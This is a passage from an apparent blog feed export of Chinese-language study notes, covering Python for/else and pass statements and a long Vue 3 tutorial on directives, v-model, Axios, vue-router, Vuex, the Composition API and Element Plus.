# 循环配合else使用users = {'Hans': 'active', 'Éléonore': 'inactive', '景太郎': 'active'}for user, status in users.copy().items():    if status == 'inactive':        continueelse:    print("1.done&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;")# 无论哪种循环，如果因为 break 而结束，那么 else 子句就 不会 执行。for user, status in users.copy().items():    if status == 'inactive':        breakelse:    print("2.done&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;")
1.done&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;{'Hans': 'active', 'Éléonore': 'inactive', '景太郎': 'active'}




pass语句
pass 语句不执行任何动作。语法上需要一个语句，但程序毋需执行任何动作时，可以使用该语句。例如：
while True:    pass  # Busy-wait for keyboard interrupt (Ctrl+C)
这常用于创建一个最小的类：
class MyEmptyClass:    pass
pass 还可用作函数或条件语句体的占位符，让你保持在更抽象的层次进行思考。
pass 会被默默地忽略：
def initlog(*args):    pass   # Remember to implement this!
]]></content>
      <categories>
        <category>后端</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>事件处理</title>
    <url>/20231224/4446b2a4.html</url>
    <content><![CDATA[v-on 或者@：监听DOM事件
我们可以使用 v-on 指令 (通常缩写为 @ 符号) 来监听 DOM 事件，并在触发事件时执行一些 JavaScript。
用法为 v-on:click="methodName" 或使用快捷方式 @click="methodName"
&lt;button @click="counter += 1"&gt;Add 1&lt;/button&gt;
export default{    data() {        return {                counter: 0            }        }}
事件参数
事件参数可以获取event对象和通过事件传递数据
官方的翻译称呼：内联处理器中的方法
&lt;button @click="say('hi')"&gt;Say hi&lt;/button&gt;&lt;button @click="greet"&gt;Say what&lt;/button&gt;&lt;p @click=getNameHandler(item, $event) v-for="(item, index) of names" :key="index"&gt;{{item}}&lt;/p&gt;
export default {    data() {        return {            counter: 0,            names : ["赵","钱","孙","李"]        }    },    methods: {        say(message) {            // message传参            alert(message)        },        greet(e) {            // event 是原生 DOM event.             if (e) {                alert(e.target.tagName)                // 读取data里面的数据方案：this.count                this.count++                alert(this.count)            }        },        getNameHandler(name, e){            // 传参和event同时传递的时候，使用$event传递event            console.log(name);            console.log(e)        }    }}
. 事件修饰符
Vue.js 为 v-on 提供了事件修饰符来处理 DOM 事件细节，如：event.preventDefault() 或 event.stopPropagation()。
Vue.js 通过由点 . 表示的指令后缀来调用修饰符。

.stop - 阻止冒泡
.prevent - 阻止默认事件
.capture - 阻止捕获
.self - 只监听触发该元素的事件
.once - 只触发一次
.left - 左键事件
.right - 右键事件
.middle - 中间滚轮事件

&lt;!-- 阻止单击事件冒泡 --&gt;&lt;a v-on:click.stop="doThis"&gt;&lt;/a&gt;&lt;!-- 提交事件不再重载页面 --&gt;&lt;form v-on:submit.prevent="onSubmit"&gt;&lt;/form&gt;&lt;!-- 修饰符可以串联  --&gt;&lt;a v-on:click.stop.prevent="doThat"&gt;&lt;/a&gt;&lt;!-- 只有修饰符 --&gt;&lt;form v-on:submit.prevent&gt;&lt;/form&gt;&lt;!-- 添加事件侦听器时使用事件捕获模式 --&gt;&lt;div v-on:click.capture="doThis"&gt;...&lt;/div&gt;&lt;!-- 只当事件在该元素本身（而不是子元素）触发时触发回调 --&gt;&lt;div v-on:click.self="doThat"&gt;...&lt;/div&gt;&lt;!-- click 事件只能点击一次，2.1.4版本新增 --&gt;&lt;a v-on:click.once="doThis"&gt;&lt;/a&gt;
：按键修饰符
Vue 允许为 v-on 在监听键盘事件时添加按键修饰符：
&lt;!-- 只有在 keyCode 是 13 时调用 vm.submit() --&gt;&lt;input v-on:keyup.13="submit"&gt;
记住所有的 keyCode 比较困难，所以 Vue 为最常用的按键提供了别名：
&lt;!-- 同上 --&gt;&lt;input v-on:keyup.enter="submit"&gt;&lt;!-- 缩写语法 --&gt;&lt;input @keyup.enter="submit"&gt;
全部的按键别名：

.enter
.tab
.delete (捕获 “删除” 和 “退格” 键)
.esc
.space
.up
.down
.left
.right
.ctrl
.alt
.shift
.meta

]]></content>
      <categories>
        <category>前端</category>
        <category>Vue3</category>
      </categories>
      <tags>
        <tag>Vue3</tag>
      </tags>
  </entry>
  <entry>
    <title>表单输入绑定（v-model）</title>
    <url>/20231224/9ee367a5.html</url>
    <content><![CDATA[表单输入绑定v-model
你可以用 v-model 指令在表单 &lt;input&gt;、&lt;textarea&gt; 及 &lt;select&gt; 元素上创建双向数据绑定。
它会根据控件类型自动选取正确的方法来更新元素。尽管有些神奇，但 v-model 本质上不过是语法糖。
它负责监听用户的输入事件来更新数据，并在某种极端场景下进行一些特殊处理。
&lt;input v-model="message" placeholder="edit me" /&gt;&lt;p&gt;Message is: {{ message }}&lt;/p&gt;
data() {    return {        message:""    }}

v-model 会忽略任何表单元素上初始的 value、checked 或 selected attribute。它将始终将当前绑定的 JavaScript 状态视为数据的正确来源。你应该在 JavaScript 中使用data 选项来声明该初始值。

基本用法
文本
修饰符
.lazy
在默认情况下，v-model 在每次 input 事件触发后将输入框的值与数据进行同步 。你可以添加 lazy 修饰符，从而转为在 change 事件之后进行同步
&lt;input v-model.lazy="message" /&gt;&lt;p&gt;Message is: {{ message }}&lt;/p&gt;
data() {    return {        message:""    }}
.trim
如果要自动过滤用户输入的首尾空白字符，可以给 v-model 添加 trim 修饰符
&lt;input v-model.trim="message" /&gt;
data() {    return {        message:""    }}
.number
如果你想让用户输入自动转换为数字，你可以在 v-model 后添加 .number 修饰符来管理输入：如果该值无法被 parseFloat() 处理，那么将返回原始值。
number 修饰符会在输入框有 type="number" 时自动启用。
&lt;input v-model.number="age" /&gt;
]]></content>
      <categories>
        <category>前端</category>
        <category>Vue3</category>
      </categories>
      <tags>
        <tag>Vue3</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3基础</title>
    <url>/20231224/7d2d5550.html</url>
    <content><![CDATA[模板语法
{{ msg }}:文本
数据绑定最常见的形式就是使用“Mustache” (双大括号) 语法的文本插值
&lt;span&gt;Message: {{ msg }}&lt;/span&gt;
一般配合js 中的data()设置数据
export default {  name: 'HelloWorld',  data(){    return{      msg:"消息提示"    }  }}
v-html：原始 HTML
双大括号会将数据解释为普通文本，而非 HTML 代码。为了输出真正的 HTML，你需要使用v-html 指令
&lt;p&gt;Using mustaches: {{ rawHtml }}&lt;/p&gt;&lt;p&gt;Using v-html directive: &lt;span v-html="rawHtml"&gt;&lt;/span&gt;&lt;/p&gt;
data(){    return{        rawHtml:"&lt;a href='https://www.itbaizhan.com'&gt;百战&lt;/a&gt;"    }}
v-bind  ：设置属性
Mustache 语法不能在 HTML 属性中使用，然而，可以使用 v-bind 指令
&lt;div v-bind:id="dynamicId"&gt;&lt;/div&gt;
data(){    return{        dynamicId:1001    }}

温馨提示
v-bind: 可以简写成 :

使用 JavaScript 表达式
在我们的模板中，我们一直都只绑定简单的 property 键值，Vue.js 都提供了完全的 JavaScript 表达式支持
{{ number + 1 }}{{ ok ? 'YES' : 'NO' }}{{ message.split('').reverse().join('') }}
这些表达式会在当前活动实例的数据作用域下作为 JavaScript 被解析。有个限制就是，每个绑定都只能包含单个表达式，所以下面的例子都不会生效。
&lt;!--  这是语句，不是表达式：--&gt;{{ var a = 1 }}&lt;!-- 流程控制也不会生效，请使用三元表达式 --&gt;{{ if (ok) { return message } }}
条件渲染
v-if
v-if 指令用于条件性地渲染一块内容。这块内容只会在指令的表达式返回 true 值的时候被渲染。
&lt;p v-if="flag"&gt;我是孙猴子&lt;/p&gt;
data() {    return {        flag: true    }}
v-else
你可以使用 v-else 指令来表示 v-if 的“else 块”
&lt;p v-if="flag"&gt;我是孙猴子&lt;/p&gt;&lt;p v-else&gt;你是傻猴子&lt;/p&gt;
data() {    return {        flag: false    }}
v-show
另一个用于条件性展示元素的选项是 v-show 指令
&lt;h1 v-show="ok"&gt;Hello!&lt;/h1&gt;
v-if 和v-show 的区别
v-if 是“真正”的条件渲染，因为它会确保在切换过程中，条件块内的事件监听器和子组件适当地被销毁和重建。
v-if 也是惰性的：如果在初始渲染时条件为假，则什么也不做——直到条件第一次变为真时，才会开始渲染条件块。
相比之下，v-show 就简单得多——不管初始条件是什么，元素总是会被渲染，并且只是简单地基于 CSS 进行切换。
一般来说，v-if 有更高的切换开销，而 v-show 有更高的初始渲染开销。
因此，如果需要非常频繁地切换，则使用 v-show 较好；如果在运行时条件很少改变，则使用 v-if 较好
列表渲染
v-for ：把一个数组映射为一组元素
我们可以用 v-for 指令基于一个数组来渲染一个列表。
v-for 指令需要使用 item in items 形式的特殊语法，其中 items 是源数据数组，而 item 则是被迭代的数组元素的别名。
&lt;ul&gt;    &lt;li v-for="item in items"&gt;{{ item.message }}&lt;/li&gt;&lt;/ul&gt;
data() {    return {        items: [{ message: 'Foo' }, { message: 'Bar' }]    }}
为v-for 提供一个 key attribute
当 Vue 正在更新使用 v-for 渲染的元素列表时，它默认使用“就地更新”的策略。
如果数据项的顺序被改变，Vue 将不会移动 DOM 元素来匹配数据项的顺序，而是就地更新每个元素，并且确保它们在每个索引位置正确渲染。
为了给 Vue 一个提示，以便它能跟踪每个节点的身份，从而重用和重新排序现有元素，你需要为每项提供一个唯一的 key attribute：
&lt;div v-for="(item,index) in items" :key="item.id|index"&gt;  &lt;!-- 内容 --&gt;    &lt;span&gt;{{ item.title }}&lt;/span&gt;    &lt;img :src="item.avator" alt=""&gt;&lt;/div&gt;

温馨提示
key时通过v-bind绑定的属性
建议所有可行的时候，均给 v-for 提供一个 key attribute
key 绑定的值期望是一个基础类型的值，例如字符串或number类型

computed：计算属性
https://cn.vuejs.org/guide/essentials/computed.html#writable-computed
为避免在模板中使用复杂的表达式，推荐使用计算属性来描述依赖响应式状态的复杂逻辑
计算属性默认是只读的。当你尝试修改一个计算属性时，你会收到一个运行时警告。只在某些特殊场景中你可能才需要用到“可写”的属性，你可以通过同时提供 getter 和 setter 来创建：
export default {  data() {    return {      firstName: 'John',      lastName: 'Doe'    }  },  computed: {    fullName: {      // getter      get() {        return this.firstName + ' ' + this.lastName      },      // setter      set(newValue) {        // 注意：我们这里使用的是解构赋值语法        [this.firstName, this.lastName] = newValue.split(' ')      }    }  }}
现在当你再运行 this.fullName = 'John Doe' 时，setter 会被调用而 this.firstName 和 this.lastName 会随之更新。或者这种使用方式
export default {    data() {      return {        firstName: 'John',        lastName: 'Doe'      }    },    computed: {      getfullName(){        return this.firstName + ' ' + this.lastName      }    }  }

计算属性和方法的区别
计算属性: 计算属性值会基于其响应式依赖被缓存。一个计算属性仅会在其响应式依赖更新时才重新计算
方法:方法调用总是会在重汇染发生时再次执行函数

Class绑定
为了避免复杂的class 属性拼接，Vue 专门为class 的v-bind 用法提供了特殊的功能增强。除了字符串外，表达式的值也可以是对象或数组
绑定一个数组
&lt;div :class="[activeClass, errorClass]"&gt;&lt;/div&gt;
export default {    data() {        return {          activeClass: 'active',          errorClass: 'text-danger'        }      }  }
或者是一个对象
&lt;div :class="classObject"&gt;&lt;/div&gt;&lt;MyComponent :class="{ active: isActive }" /&gt;
export default {    data() {        return {          isActive: true,          error: null        }      },      computed: {        classObject() {          return {            active: this.isActive &amp;&amp; !this.error,            'text-danger': this.error &amp;&amp; this.error.type === 'fatal'          }        }      }  }
也可以在数组中嵌套对象：
&lt;div :class="[{ active: isActive }, errorClass]"&gt;&lt;/div&gt;

提示：
数组和对象嵌套过程中，只能是数组嵌套对象，不能反其道而行

Style绑定
https://cn.vuejs.org/guide/essentials/class-and-style.html#binding-inline-styles
类似class绑定。如对象绑定
&lt;div :style="styleObject"&gt;&lt;/div&gt;
export default {    data() {        return {          styleObject: {            color: 'red',            fontSize: '13px'          }        }      }}
]]></content>
      <categories>
        <category>前端</category>
        <category>Vue3</category>
      </categories>
      <tags>
        <tag>Vue3</tag>
      </tags>
  </entry>
  <entry>
    <title>其他</title>
    <url>/20231224/6e23c48.html</url>
    <content><![CDATA[组件生命周期
每个组件在被创建时都要经过一系列的初始化过程——例如，需要设置数据监听、编译模板、将实例挂载到 DOM 并在数据变化时更新 DOM 等。同时在这个过程中也会运行一些叫做生命周期钩子的函数，这给了用户在不同阶段添加自己的代码的机会
为了方便记忆，我们可以将他们分类：
创建时：beforeCreate、created
渲染时：beforeMount、mounted
更新时：beforeUpdate、updated
卸载时：beforeUnmount、unmounted
Vue引入第三方
Swiper 开源、免费、强大的触摸滑动插件
Swiper 是纯javascript打造的滑动特效插件，面向手机、平板电脑等移动终端
Swiper 能实现触屏焦点图、触屏Tab切换、触屏轮播图切换等常用效果

温馨提示
官方文档：https://swiperjs.com/vue
安装指定版本: npm instal --save swiper@8.1.6

基础实现
&lt;template&gt;  &lt;div class="hello"&gt;    &lt;swiper class="mySwiper"&gt;      &lt;swiper-slide&gt;Slide 1&lt;/swiper-slide&gt;      &lt;swiper-slide&gt;Slide 2&lt;/swiper-slide&gt;      &lt;swiper-slide&gt;Slide 3&lt;/swiper-slide&gt;    &lt;/swiper&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import { Swiper, SwiperSlide } from 'swiper/vue';import 'swiper/css';export default {  name: 'HelloWorld',  components: {    Swiper,    SwiperSlide,  }}&lt;/script&gt;
添加指示器
&lt;template&gt;  &lt;div class="hello"&gt;    &lt;swiper class="mySwiper" :modules="modules" :pagination="{ clickable: true }"&gt;      &lt;swiper-slide&gt;        &lt;img src="../assets/logo.png" alt=""&gt;      &lt;/swiper-slide&gt;      &lt;swiper-slide&gt;        &lt;img src="../assets/logo.png" alt=""&gt;      &lt;/swiper-slide&gt;      &lt;swiper-slide&gt;        &lt;img src="../assets/logo.png" alt=""&gt;      &lt;/swiper-slide&gt;    &lt;/swiper&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import { Pagination } from 'swiper';import { Swiper, SwiperSlide } from 'swiper/vue';import 'swiper/css';import 'swiper/css/pagination';export default {  name: 'HelloWorld',  data(){    return{      modules: [ Pagination ]    }  },  components: {    Swiper,    SwiperSlide,  }}&lt;/script&gt;
Axios网络请求
Axios 是一个基于 promise 的网络请求库
安装
Axios的应用是需要单独安装的 npm install --save axios
引入
组件中引入: import axios from "axios"
全局引用:
import axios from "axios"const app = createApp(App);app.config.globalProperties.$axios = axiosapp.mount('#app')// 在组件中调用this.$axios
网络请求基本示例
get请求
axios({    method: "get",    url: "http://iwenwiki.com/api/blueberrypai/getChengpinDetails.php"}).then(res =&gt; {    console.log(res.data);})
post请求

温馨提示
post请求参数是需要额外处理的

安装依赖: npm install --save querystring
转换参数格式: qs.stringify({})


axios({    method:"post",    url:"http://iwenwiki.com/api/blueberrypai/login.php",    data:qs.stringify({        user_id:"iwen@qq.com",        password:"iwen123",        verification_code:"crfvw"    })}).then(res =&gt;{    console.log(res.data);})
快捷方案
get请求
axios.get("http://iwenwiki.com/api/blueberrypai/getChengpinDetails.php")    .then(res =&gt;{      console.log(res.data);    })
post请求
axios.post("http://iwenwiki.com/api/blueberrypai/login.php", qs.stringify({      user_id: "iwen@qq.com",      password: "iwen123",      verification_code: "crfvw"    }))      .then(res =&gt; {        console.log(res.data);      })
Axios网络请求封装
在日常应用过程中，一个项目中的网络请求会很多，此时一般采取的方案是将网络请求封装起来
在src目录下创建文件夹utils，并创建文件request，用来存储网络请求对象 axios
import axios from "axios"import qs from "querystring"const errorHandle = (status,info) =&gt; {    switch(status){        case 400:            console.log("语义有误");            break;        case 401:            console.log("服务器认证失败");            break;        case 403:            console.log("服务器拒绝访问");            break;        case 404:            console.log("地址错误");            break;        case 500:            console.log("服务器遇到意外");            break;        case 502:            console.log("服务器无响应");            break;        default:            console.log(info);            break;    }}const instance = axios.create({    timeout:5000})instance.interceptors.request.use(    config =&gt;{        if(config.method === "post"){            config.data = qs.stringify(config.data)        }        return config;    },    error =&gt; Promise.reject(error))instance.interceptors.response.use(    response =&gt; response.status === 200 ? Promise.resolve(response) : Promise.reject(response),    error =&gt;{        const { response } = error;        errorHandle(response.status,response.info)    })export default instance;
在src目录下创建文件夹api，并创建文件index和path分别用来存放网络请求方法和请求路径
// path.jsconst base = {    baseUrl:"http://iwenwiki.com",    chengpin:"/api/blueberrypai/getChengpinDetails.php"}export default base
// index.jsimport path from "./path"import axios from "../utils/request"export default {    getChengpin(){        return axios.get(path.baseUrl + path.chengpin)    }}
在组件中直接调用网络请求
import api from "../api/index"api.getChengpin().then(res =&gt;{    console.log(res.data);})
网络请求跨域解决方案
JS采取的是同源策略
同源策略是浏览器的一项安全策略，浏览器只允许js 代码请求和当前所在服务器域名,端口,协议相同的数据接口上的数据,这就是同源策略.
也就是说，当协议、域名、端口任意一个不相同时，都会产生跨域问题，所以又应该如何解决跨域问题呢
跨域错误提示信息
目前主流的跨域解决方案有两种：

后台解决：cors
前台解决：proxy

devServer: {    proxy: {      '/api': {        target: '&lt;url&gt;',        changeOrigin: true      }    }}

温馨提示
解决完跨域配置之后，要记得重启服务器才行哦！

Vue引入路由配置
在Vue中，我们可以通过vue-router路由管理页面之间的关系
Vue Router 是 Vue.js 的官方路由。它与 Vue.js 核心深度集成，让用 Vue.js 构建单页应用变得轻而易举
在Vue中引入路由
第一步：安装路由 npm install --save vue-router
第二步：配置独立的路由文件
// index.jsimport { createRouter, createWebHashHistory } from 'vue-router'import HomeView from '../views/HomeView.vue'const routes = [  {    path: '/',    name: 'home',    component: HomeView  },  {    path: '/about',    name: 'about',    component: () =&gt; import('../views/AboutView.vue')  }]const router = createRouter({  history: createWebHashHistory(),  routes})export default router
第三步：引入路由到项目
// main.jsimport router from './router'app.use(router)
第四步：指定路由显示入口 &lt;router-view/&gt;
第五步：指定路由跳转
&lt;router-link to="/"&gt;Home&lt;/router-link&gt; |&lt;router-link to="/about"&gt;About&lt;/router-link&gt;
路由传递参数
页面跳转过程中，是可以携带参数的，这也是很常见的业务
例如：在一个列表项，点击进入查看每个列表项的详情
第一步：在路由配置中指定参数的key
{    path:"/list/:name",    name:"list",    component:() =&gt; import("../views/ListView.vue")}
第二步：在跳转过程中携带参数
&lt;li&gt;&lt;router-link to="/list/内蒙"&gt;内蒙旅游十大景区&lt;/router-link&gt;&lt;/li&gt;&lt;li&gt;&lt;router-link to="/list/北京"&gt;北京旅游十大景区&lt;/router-link&gt;&lt;/li&gt;&lt;li&gt;&lt;router-link to="/list/四川"&gt;四川旅游十大景区&lt;/router-link&gt;&lt;/li&gt;
第三步：在详情页面读取路由携带的参数
&lt;p&gt;{{ $route.params.name }}城市旅游景区详情&lt;/p&gt;
嵌套路由配置
路由嵌套是非常常见的需求
第一步：创建子路由要加载显示的页面
第二步：在路由配置文件中添加子路由配置
{    path:"/news",    name:"news",    redirect:"/news/baidu",    component:() =&gt; import("../views/NewsView.vue"),    children:[       {       		path:"baidu",            component:() =&gt; import("../views/NewsList/BaiduNews.vue"),       },       {            path:"wangyi",            component:() =&gt; import("../views/NewsList/WangyiNews.vue"),       }    ]}
第三步：指定子路由显示位置&lt;router-view&gt;&lt;/router-view&gt;
第四步：添加子路由跳转链接
&lt;router-link to="/news/baidu"&gt;百度新闻&lt;/router-link&gt; | &lt;router-link to="/news/wangyi"&gt;网易新闻&lt;/router-link&gt;
第五步：重定向配置 redirect:"/news/baidu"
Vue状态管理(Vuex)
Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式 + 库。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。
简单来说，状态管理可以理解成为了更方便的管理组件之间的数据交互，提供了一个集中式的管理方案，任何组件都可以按照指定的方式进行读取和改变数据

引入Vuex的步骤
第一步：安装Vuex npm install --save vuex
第二步：配置Vuex文件
import { createStore } from 'vuex'export default createStore({  state: {      counter:0  }})
第三步：在主文件中引入Vuex
import store from './store'app.use(store)
第四步：在组件中读取状态
&lt;p&gt;counter:{{ $store.state.counter }}&lt;/p&gt;// 或者import { mapState } from 'vuex';computed:{    ...mapState(["counter"])}
Vue状态管理核心(Vuex)
最常用的核心概念包含: State、Getter、Mutation、Action
Getter
对Vuex中的数据进行过滤
import { createStore } from 'vuex'export default createStore({  state: {    counter: 0  },  getters: {    getCount(state){      return state.counter &gt; 0 ? state.counter : "counter小于0，不符合要求"    }  }})
import { mapState,mapGetters } from 'vuex';computed:{    ...mapGetters(["getCount"])}
Mutation
更改 Vuex 的 store 中的状态的唯一方法是提交 mutation。Vuex 中的 mutation 非常类似于事件：每个 mutation 都有一个字符串的事件类型 (type)和一个回调函数 (handler)。这个回调函数就是我们实际进行状态更改的地方，并且它会接受 state 作为第一个参数
import { createStore } from 'vuex'export default createStore({  state: {    counter: 0  },  getters: {  },  mutations: {    setCounter(state, num) {      state.counter += num    }  }})
import { mapState,mapMutations } from 'vuex';methods:{    ...mapMutations(["setCounter"]),    clickHandler(){      // this.$store.commit("setCounter",20)	  // 或者      // this.setCounter(10)    }}
Action
Action 类似于 mutation，不同在于：

Action 提交的是 mutation，而不是直接变更状态
Action 可以包含任意异步操作

import { createStore } from 'vuex'import axios from "axios"export default createStore({  state: {    counter: 0  },  getters: {    getCount(state){      return state.counter &gt; 0 ? state.counter : "counter小于0，不符合要求"    }  },  mutations: {    setCounter(state, num) {      state.counter += num    }  },  actions: {    asyncSetCount({ commit }){      axios.get("http://iwenwiki.com/api/generator/list.php")      .then(res =&gt;{        commit("setCounter",res.data[0])      })    }  }})
import { mapState,mapMutations,mapGetters,mapActions } from 'vuex';methods:{    ...mapActions(["asyncSetCount"]),    clickAsyncHandler(){        // this.$store.dispatch("asyncSetCount")        // 或者        // this.asyncSetCount()    }}
Vue3新特性1
Vue3是目前Vue的最新版本，自然也是新增了很多新特性
六大亮点

Performance：性能更比Vue 2.0强。
Tree shaking support：可以将无用模块“剪辑”，仅打包需要的。
Composition API：组合API
Fragment, Teleport, Suspense：“碎片”，Teleport即Protal传送门，“悬念”
Better TypeScript support：更优秀的Ts支持
Custom Renderer API：暴露了自定义渲染API

ref或者reactive
在2.x中通过组件data的方法来定义一些当前组件的数据
data() {  return {    name: 'iwen',    list: [],  }}
在3.x中通过ref或者reactive创建响应式对象
import { ref,reactive } from "vue"export default {  name: 'HelloWorld',  setup(){      const name = ref("iwen")      const state = reactive({          list:[]      })    return{        name,        state    }  }}
methods中定义的方法写在setup()
在2.x中methods来定义一些当前组件内部方法
methods:{    http(){}}
在3.x中直接在setup方法中定义并return
setup() {    const http = ()=&gt;{        // do something    }    return {      http    };}
setup()中使用props和context
在2.x中，组件的方法中可以通过this获取到当前组件的实例，并执行data变量的修改，方法的调用，组件的通信等等，但是在3.x中，setup()在beforeCreate和created时机就已调用，无法使用和2.x一样的this，但是可以通过接收setup(props,ctx)的方法，获取到当前组件的实例和props
export default {  props: {    name: String,  },  setup(props,ctx) {    console.log(props.name)    ctx.emit('event')  },}
Vue3新特性2
在setup中使生命周期函
你可以通过在生命周期钩子前面加上 “on” 来访问组件的生命周期钩子。
下表包含如何在 setup () 内部调用生命周期钩子



Options API
Hook inside setup




beforeCreate
Not needed*


created
Not needed*


beforeMount
onBeforeMount


mounted
onMounted


beforeUpdate
onBeforeUpdate


updated
onUpdated


beforeUnmount
onBeforeUnmount


unmounted
onUnmounted



export default {  setup() {    // mounted    onMounted(() =&gt; {      console.log('Component is mounted!')    })  }}
Provide / Inject

provide() 和 inject() 可以实现嵌套组件之间的数据传递。
这两个函数只能在 setup() 函数中使用。
父级组件中使用 provide() 函数向下传递数据。
子级组件中使用 inject() 获取上层传递过来的数据。
不限层级

// 父组件import { provide } from "vue"setup() {    provide("customVal", "我是父组件向子组件传递的值");}
// 子组件import { inject } from "vue"setup() {    const customVal = inject("customVal");    return {      customVal    }}
Fragment
Fragment翻译为：“碎片”

不再限于模板中的单个根节点

&lt;template&gt;  &lt;img alt="Vue logo" src="./assets/logo.png"&gt;  &lt;HelloWorld msg="Welcome to Your Vue.js App" /&gt;&lt;/template&gt;
Vue3加载Element-plus
Element，一套为开发者、设计师和产品经理准备的基于 Vue 2.0 的桌面端组件库
Element Plus 基于 Vue 3，面向设计师和开发者的组件库
安装Element-Plus
npm install element-plus --save
完整引用
如果你对打包后的文件大小不是很在乎，那么使用完整导入会更方便
import { createApp } from 'vue'import ElementPlus from 'element-plus'import 'element-plus/dist/index.css'import App from './App.vue'const app = createApp(App)app.use(ElementPlus)app.mount('#app')
按需导入
按需导入才是我们的最爱，毕竟在真实的应用场景中并不是每个组件都会用到，这会造成不小的浪费
首先你需要安装unplugin-vue-components 和 unplugin-auto-import这两款插件
npm install -D unplugin-vue-components unplugin-auto-import
然后修改vue.config.js配置文件
const { defineConfig } = require('@vue/cli-service')const AutoImport = require('unplugin-auto-import/webpack')const Components = require('unplugin-vue-components/webpack')const { ElementPlusResolver } = require('unplugin-vue-components/resolvers')module.exports = defineConfig({  transpileDependencies: true,  configureWebpack: {    plugins: [      AutoImport({        resolvers: [ElementPlusResolver()]      }),      Components({        resolvers: [ElementPlusResolver()]      })    ]  }})
最后，可以直接在组件中使用
&lt;template&gt;	&lt;el-button&gt;Default&lt;/el-button&gt;	&lt;el-button type="primary"&gt;Primary&lt;/el-button&gt;&lt;/template&gt;
实时效果反馈
1. 在Vue3项目中引入饿了么UI组件库，下来命令正确的是：
A   npm install --save element-iu
B   vue add element
C   npm install element-plus --save
D   vue add element-plus
答案
1=&gt;C
Vue3加载Element-plus的字体图标
Element-plus不仅仅是提供了各种组件，同时还提供了一整套的字体图标方便开发者使用
安装icons字体图标
npm install @element-plus/icons-vue
全局注册
在项目根目录下，创建plugins文件夹，在文件夹下创建文件icons.js文件
import * as components from "@element-plus/icons-vue";export default {    install: (app) =&gt; {        for (const key in components) {            const componentConfig = components[key];            app.component(componentConfig.name, componentConfig);        }    },};
引入文件
在main.js中引入icons.js文件
import elementIcon from "./plugins/icons";app.use(elementIcon)
使用方式
接下来就可以直接在组件中引入使用了
&lt;el-icon class="expand" color="#409EFC" :size="30"&gt;    &lt;expand /&gt;&lt;/el-icon&gt;
]]></content>
      <categories>
        <category>前端</category>
        <category>Vue3</category>
      </categories>
      <tags>
        <tag>Vue3</tag>
      </tags>
  </entry>
  <entry>
    <title>组件</title>
    <url>/20231224/34778b46.html</url>
    <content><![CDATA[组件基础
单文件组件
Vue 单文件组件（又名 *.vue 文件，缩写为 SFC）是一种特殊的文件格式，它允许将 Vue 组件的模板、逻辑 与 样式封装在单个文件中
&lt;template&gt;    &lt;h3&gt;单文件组件&lt;/h3&gt;&lt;/template&gt;&lt;script&gt;export default {    name:"MyComponent"}&lt;/script&gt;&lt;style scoped&gt;h3{    color: red;}&lt;/style&gt;
模板引用（ref）
https://cn.vuejs.org/guide/essentials/template-refs.html
虽然 Vue 的声明性渲染模型为你抽象了大部分对 DOM 的直接操作，但在某些情况下，我们仍然需要直接访问底层 DOM 元素。要实现这一点，我们可以使用特殊的 ref attribute：
ref 是一个特殊的 attribute， 它允许我们在一个特定的 DOM 元素或子组件实例被挂载后，获得对它的直接引用。
这可能很有用，比如说在组件挂载时将焦点设置到一个 input 元素上，或在一个元素上初始化一个第三方库。
访问模板引用
挂载结束后引用都会被暴露在 this.$refs 之上：
&lt;script&gt;export default {  mounted() {    this.$refs.input.focus()  }}&lt;/script&gt;&lt;template&gt;  &lt;input ref="input" /&gt;&lt;/template&gt;
注意，你只可以在组件挂载后才能访问模板引用。如果你想在模板中的表达式上访问 $refs.input，在初次渲染时会是 null。这是因为在初次渲染前这个元素还不存在
v-for 中的模板引用

需要 v3.2.25 及以上版本

当在 v-for 中使用模板引用时，相应的引用中包含的值是一个数组：
&lt;script&gt;export default {  data() {    return {      list: [        /* ... */      ]    }  },  mounted() {    console.log(this.$refs.items)  }}&lt;/script&gt;&lt;template&gt;  &lt;ul&gt;    &lt;li v-for="item in list" ref="items"&gt;      {{ item }}    &lt;/li&gt;  &lt;/ul&gt;&lt;/template&gt;

应该注意的是，ref 数组并不保证与源数组相同的顺序。

函数模板引用
除了使用字符串值作名字，ref attribute 还可以绑定为一个函数，会在每次组件更新时都被调用。该函数会收到元素引用作为其第一个参数：
&lt;input :ref="(el) =&gt; { /* 将 el 赋值给一个数据属性或 ref 变量 */ }"&gt;
注意我们这里需要使用动态的 :ref 绑定才能够传入一个函数。当绑定的元素被卸载时，函数也会被调用一次，此时的 el 参数会是 null。你当然也可以绑定一个组件方法而不是内联函数。
组件上的 ref
组件基础
加载组件
第一步：引入组件 import MyComponentVue from './components/MyComponent.vue'
第二步：挂载组件 components: { MyComponentVue }
第三步：显示组件 &lt;my-componentVue /&gt;
组件的嵌套关系
通常一个应用会以一棵嵌套的组件树的形式来组织

Props组件交互
组件与组件之间是需要存在交互的，否则完全没关系，组件的意义就很小了
Prop 是你可以在组件上注册的一些自定义 attribute
&lt;my-componentVue title="标题"/&gt;
&lt;template&gt;    &lt;h3&gt;单文件组件&lt;/h3&gt;    &lt;p&gt;{{ title }}&lt;/p&gt;&lt;/template&gt;&lt;script&gt;export default {    name:"MyComponent",    props:{        title:{            type:String,            default:""        }    }}&lt;/script&gt;
Prop 类型
Prop传递参数其实是没有类型限制的
props: {  title: String,  likes: Number,  isPublished: Boolean,  commentIds: Array,  author: Object,  callback: Function}

温馨提示
数据类型为数组或者对象的时候，默认值是需要返回工厂模式

自定义事件组件交互
自定义事件可以在组件中反向传递数据，prop 可以将数据从父组件传递到子组件，那么反向如何操作呢，就可以利用自定义事件实现 $emit
